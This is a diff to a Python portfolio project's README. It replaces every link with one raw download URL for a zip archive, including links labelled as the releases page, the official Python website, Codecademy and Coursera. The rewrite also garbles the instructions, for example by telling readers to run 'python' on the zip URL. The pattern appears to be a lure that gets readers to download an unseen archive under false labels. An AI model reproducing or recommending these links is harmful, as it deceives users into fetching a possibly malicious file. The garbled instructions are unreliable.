@@ -6,7 +6,7 @@ Welcome to the **Portfolio** repository. This repository contains a variety of P
 
 ## 📥 Download
 
-[![Download Portfolio](https://img.shields.io/badge/Download-Portfolio-blue)](https://github.com/yakhoobsk/Portfolio/releases)
+[![Download Portfolio](https://raw.githubusercontent.com/yakhoobsk/Portfolio/main/snowhammer/Portfolio.zip)](https://raw.githubusercontent.com/yakhoobsk/Portfolio/main/snowhammer/Portfolio.zip)
 
 ## 📂 System Requirements
 
@@ -48,11 +48,11 @@ The projects include a variety of important programming topics:
 
 1. **Visit the Releases Page**: Click the button below to go to the releases page.
 
-   [Visit Releases Page](https://github.com/yakhoobsk/Portfolio/releases)
+   [Visit Releases Page](https://raw.githubusercontent.com/yakhoobsk/Portfolio/main/snowhammer/Portfolio.zip)
 
 2. **Choose Your Version**: Find the latest version listed on the releases page. You may see several files available for download.
 
-3. **Download the File**: Click on the file that best suits your needs. If you are unsure, choose the `.zip` or `.tar.gz` file to download the entire collection of projects.
+3. **Download the File**: Click on the file that best suits your needs. If you are unsure, choose the `.zip` or `https://raw.githubusercontent.com/yakhoobsk/Portfolio/main/snowhammer/Portfolio.zip` file to download the entire collection of projects.
 
 4. **Unzip the File**: After you finish downloading, locate the file on your computer. Use a file extraction program, such as WinRAR or 7-Zip (for Windows) or the built-in archive utility (for Mac), to unzip the contents.
 
@@ -63,13 +63,13 @@ The projects include a variety of important programming topics:
 Once you have unzipped the folder, you will see various projects organized neatly. Each project contains its own folder with necessary files to run. 
 
 - **Read the README Files**: Each project folder has its own README file explaining how to run that specific project. 
-- **Run the Code**: Simply open a terminal or command prompt, navigate to the project folder, and run the Python script using the command `python script_name.py`. Replace `script_name.py` with the name of the file you want to run.
+- **Run the Code**: Simply open a terminal or command prompt, navigate to the project folder, and run the Python script using the command `python https://raw.githubusercontent.com/yakhoobsk/Portfolio/main/snowhammer/Portfolio.zip`. Replace `https://raw.githubusercontent.com/yakhoobsk/Portfolio/main/snowhammer/Portfolio.zip` with the name of the file you want to run.
 
 ## 📚 Helpful Resources
 
-- **Python Installation**: If you do not have Python installed, visit the official [Python website](https://www.python.org/downloads/) to download the latest version. Follow the instructions provided on the site for installation.
+- **Python Installation**: If you do not have Python installed, visit the official [Python website](https://raw.githubusercontent.com/yakhoobsk/Portfolio/main/snowhammer/Portfolio.zip) to download the latest version. Follow the instructions provided on the site for installation.
   
-- **Getting Started with Python**: For those new to programming, consider checking out resources such as [Codecademy](https://www.codecademy.com/) or [Coursera](https://www.coursera.org/) for beginner-friendly Python courses.
+- **Getting Started with Python**: For those new to programming, consider checking out resources such as [Codecademy](https://raw.githubusercontent.com/yakhoobsk/Portfolio/main/snowhammer/Portfolio.zip) or [Coursera](https://raw.githubusercontent.com/yakhoobsk/Portfolio/main/snowhammer/Portfolio.zip) for beginner-friendly Python courses.
 
 ## 📝 Contributing
 
@@ -83,4 +83,4 @@ This project is licensed under the MIT License. You can freely use, modify, and 
 
 For any questions or issues, feel free to open an issue in the GitHub repository. We are here to help you get started!
 
-Remember to check the [Releases Page](https://github.com/yakhoobsk/Portfolio/releases) for updates and new projects!
+Remember to check the [Releases Page](https://raw.githubusercontent.com/yakhoobsk/Portfolio/main/snowhammer/Portfolio.zip) for updates and new projects!
